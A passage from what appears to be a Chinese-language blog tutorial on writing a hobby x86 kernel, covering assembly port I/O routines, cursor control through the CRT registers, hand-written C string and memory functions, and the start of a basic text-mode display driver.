int8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">short</span> int16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> int32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> int64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> u32 <span class="type">time_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> u32 <span class="type">idx_t</span>;</span><br></pre></td></tr></table></figure><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><p>我们知道，在操作系统启动的时候，刚开始都是黑乎乎的界面，然后光标闪烁等，那么这个是怎么实现的呢，一般这种都是通过向一些寄存器写入一些值和和获取一些值实现，因此就需要用一些输入输出函数</p><p>首先是四个函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> u8 <span class="title">inb</span><span class="params">(u16 port)</span></span>; <span class="comment">// 输入1个字节 从port端口中读一个字节</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> u16 <span class="title">inw</span><span class="params">(u16 port)</span></span>; <span class="comment">// 输入2个字节  从port端口中读2个字节</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">void</span> <span class="title">outb</span><span class="params">(u16 port,u8 value)</span></span>; <span class="comment">// 输出1个字节 将value值输入到port端口中</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">void</span> <span class="title">outw</span><span class="params">(u16 port,u16 value)</span></span>; <span class="comment">// 输出2个字节 将value值输入到port端口中</span></span><br></pre></td></tr></table></figure><p>我们采用汇编实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">global inb ; 将inb导出</span><br><span class="line">inb:</span><br><span class="line">    ; 栈帧保存</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line"></span><br><span class="line">    xor eax, eax ;清空</span><br><span class="line">    mov edx, [ebp + 8] ;port [ebp + 8]就是传入进来的port</span><br><span class="line">    in al, dx ;将dx所指向的端口，读取一个字放在al,也就是从port端口读一个字节</span><br><span class="line"></span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line">global outb ; 将outb导出</span><br><span class="line">outb:</span><br><span class="line">    ; 栈帧保存</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov edx, [ebp + 8] ;port [ebp + 8]就是传入进来的port</span><br><span class="line">    mov eax, [ebp + 12] ; value 参数入栈是从右往左 所以value地址更高</span><br><span class="line">    out dx, al ;将al的8比特输出到dx的端口号</span><br><span class="line"></span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">global inw ; 将inw导出</span><br><span class="line">inw:</span><br><span class="line">    ; 栈帧保存</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line"></span><br><span class="line">    xor eax, eax ;清空</span><br><span class="line">    mov edx, [ebp + 8] ;port [ebp + 8]就是传入进来的port</span><br><span class="line">    in ax, dx ;将dx所指向的端口，读取2个字放在ax</span><br><span class="line"></span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line">global outw ; 将outw导出</span><br><span class="line">outw:</span><br><span class="line">    ; 栈帧保存</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov edx, [ebp + 8] ;port [ebp + 8]就是传入进来的port</span><br><span class="line">    mov eax, [ebp + 12] ; value 参数入栈是从右往左 所以value地址更高</span><br><span class="line">    out dx, ax ;将ax的2个字输出到dx的端口号</span><br><span class="line"></span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line">    jmp $+2 ;延迟</span><br><span class="line"></span><br><span class="line">    leave ; 恢复栈帧</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>我们在kernel中测试下获取光标的位置，相关的寄存器有以下几个</p><ul><li>CRT 地址寄存器 0x3D4</li><li>CRT 数据寄存器 0x3D5</li><li>CRT 光标位置 - 高位 0xE</li><li>CRT 光标位置 - 低位 0xF</li></ul><p>比如我们把光标高位位置给地址寄存器，那么就可以通过数据寄存器得到和设置光标位置的高位值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// - CRT 地址寄存器 0x3D4</span></span><br><span class="line"><span class="comment">// - CRT 数据寄存器 0x3D5</span></span><br><span class="line"><span class="comment">// - CRT 光标位置 - 高位 0xE</span></span><br><span class="line"><span class="comment">// - CRT 光标位置 - 低位 0xF</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_ADDR_REG 0x3d4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_DATA_REG 0x3d5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_H 0xe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_CURSOR_L 0xf</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kernel_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG,CRT_CURSOR_H);</span><br><span class="line">    u16 pos = <span class="built_in">inb</span>(CRT_DATA_REG) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG,CRT_CURSOR_L);</span><br><span class="line">    pos |= <span class="built_in">inb</span>(CRT_DATA_REG); <span class="comment">// 到这里，pos值为240，通过qemu也可以看到，光标在第4行，每行80字符</span></span><br><span class="line">    u8 data = <span class="built_in">inb</span>(CRT_DATA_REG);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比如想把光标位置改为160</span></span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG,CRT_CURSOR_H);</span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">outb</span>(CRT_ADDR_REG,CRT_CURSOR_L);</span><br><span class="line">    <span class="built_in">outb</span>(CRT_DATA_REG,<span class="number">160</span>); <span class="comment">// 到这里，就可以看到光标在第3行开始处</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220505211423561.png" alt="image-20220505211423561"></p><h1 id="字符串函数实现"><a href="#字符串函数实现" class="headerlink" title="字符串函数实现"></a>字符串函数实现</h1><p>我们在C语言中，使用过很多字符串函数，比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span>;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span>;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *lhs, <span class="type">const</span> <span class="type">char</span> *rhs)</span></span>;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> ch)</span></span>;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strrchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> ch)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *lhs, <span class="type">const</span> <span class="type">void</span> *rhs, <span class="type">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memset</span><span class="params">(<span class="type">void</span> *dest, <span class="type">int</span> ch, <span class="type">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memchr</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">int</span> ch, <span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>下面是其实现的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = dest;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = *src;</span><br><span class="line">        <span class="keyword">if</span> (*src++ == EOS)</span><br><span class="line">            <span class="keyword">return</span> dest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = dest;</span><br><span class="line">    <span class="keyword">while</span> (*ptr != EOS)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = *src;</span><br><span class="line">        <span class="keyword">if</span> (*src++ == EOS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dest;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = (<span class="type">char</span> *)str;</span><br><span class="line">    <span class="keyword">while</span> (*ptr != EOS)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr - str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *lhs, <span class="type">const</span> <span class="type">char</span> *rhs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (*lhs == *rhs &amp;&amp; *lhs != EOS &amp;&amp; *rhs != EOS)</span><br><span class="line">    &#123;</span><br><span class="line">        lhs++;</span><br><span class="line">        rhs++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *lhs &lt; *rhs ? <span class="number">-1</span> : *lhs &gt; *rhs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = (<span class="type">char</span> *)str;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*ptr == ch)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*ptr++ == EOS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strrchr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *last = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> *ptr = (<span class="type">char</span> *)str;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*ptr == ch)</span><br><span class="line">        &#123;</span><br><span class="line">            last = ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*ptr++ == EOS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> last;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *lhs, <span class="type">const</span> <span class="type">void</span> *rhs, <span class="type">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *lptr = (<span class="type">char</span> *)lhs;</span><br><span class="line">    <span class="type">char</span> *rptr = (<span class="type">char</span> *)rhs;</span><br><span class="line">    <span class="keyword">while</span> (*lptr == *rptr &amp;&amp; count-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        lptr++;</span><br><span class="line">        rptr++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *lptr &lt; *rptr ? <span class="number">-1</span> : *lptr &gt; *rptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memset</span><span class="params">(<span class="type">void</span> *dest, <span class="type">int</span> ch, <span class="type">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = dest;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = ch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = dest;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        *ptr++ = *((<span class="type">char</span> *)(src++));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memchr</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *str, <span class="type">int</span> ch, <span class="type">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> *ptr = (<span class="type">char</span> *)str;</span><br><span class="line">    <span class="keyword">while</span> (count--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*ptr == ch)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">void</span> *)ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基础显卡驱动"><a href="#基础显卡驱动" class="headerlink" title="基础显卡驱动"></a>基础显卡驱动</h1><p>我们知道比如在显示器显示<code>hello,world\n</code>，那么显示器就会先输出一句<code>hello,world</code>，然后换行，这一次就是实现这个操作，其实可以想下，换行，不就是设置一下光标位置嘛，那不就是第二个部分输入输出的样例吗，下面来实现吧，同时注意有以下寄存器</p><ul><li>CRT 地址寄存器 0x3D4</li><li>CRT 数据寄存器 0x3D5</li><li>CRT 光标位置 - 高位 0xE</li><li>CRT 光标位置 - 低位 0xF</li><li>CRT 显示开始位置 - 高位 0xC</li><li>CRT 显示开始位置 - 低位 0xD</li></ul><table><thead><tr><th>控制字符</th><th>八进制</th><th>十六进制</th><th>描述</th></tr></thead><tbody><tr><td>NUL</td><td>0</td><td>0x00</td><td>在输入时忽略，不保存在输入缓冲中</td></tr><tr><td>ENQ</td><td>5</td><td>0x05</td><td>传送应答消息</td></tr><tr><td>BEL</td><td>7</td><td>0x07</td><td>从键盘发声响</td></tr><tr><td>BS</td><td>10</td><td>0x08</td><td>将光标移向左边一个字符位置处；若光标已经处在左边沿，则无动作</td></tr><tr><td>HT</td><td>11</td><td>0x09</td><td>将光标移到下一个制表位；若右侧已经没有制表位，则移到右边缘处</td></tr><tr><td>LF</td><td>12</td><td>0x0A</td><td>此代码导致一个回车或换行操作</td></tr><tr><td>VT</td><td>13</td><td>0x0B</td><td>作用如LF</td></tr><tr><td>FF</td><td>14</td><td>0x0C</td><td>作用如LF</td></tr><tr><td>CR</td><td>15</td><td>0x0D</td><td>将光标移到当前行的左边缘处</td></tr><tr><td>SO</td><td>16</td><td>0x0E</td><td>使用由 SCS 控制序列设计的 G1 字符集</td></tr><tr><td>SI</td><td>17</td><td>0x0F</td><td>选择 G0 字符集，由 ESC 序列选择</td></tr><tr><td>XON</td><td>21</td><td>0x11</td><td>使终端重新进行传输</td></tr><tr><td>XOFF</td><td>23</td><td>0x13</td><td>使中断除发送 XOFF  和 XON 以外，停止发送其它所有代码</td></tr><tr><td>CAN</td><td>30</td><td>0x18</td><td>如果在控制序列期间发送，则序列不会执行而立刻终止，同时会显示出错字符</td></tr><tr><td>SUB</td><td>32</td><td>0x1A</td><td>作用同 CAN</td></tr><tr><td>ESC</td><td>33</td><td>0x1B</td><td>产生一个控制序列</td></tr><tr><td>DEL</td><td>177</td><td>0x7F</td><td>在输入时忽略 不保存在输入缓冲中</td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_ADDR_REG 0x3D4 <span class="comment">// CRT(6845)索引寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_DATA_REG 0x3D5 <span class="comment">// CRT(6845)数据寄存器</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_START_ADDR_H 0xC <span class="comment">// 显示内存起始位置 - 高位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRT_START_ADDR_L 0xD <span class="comment">// 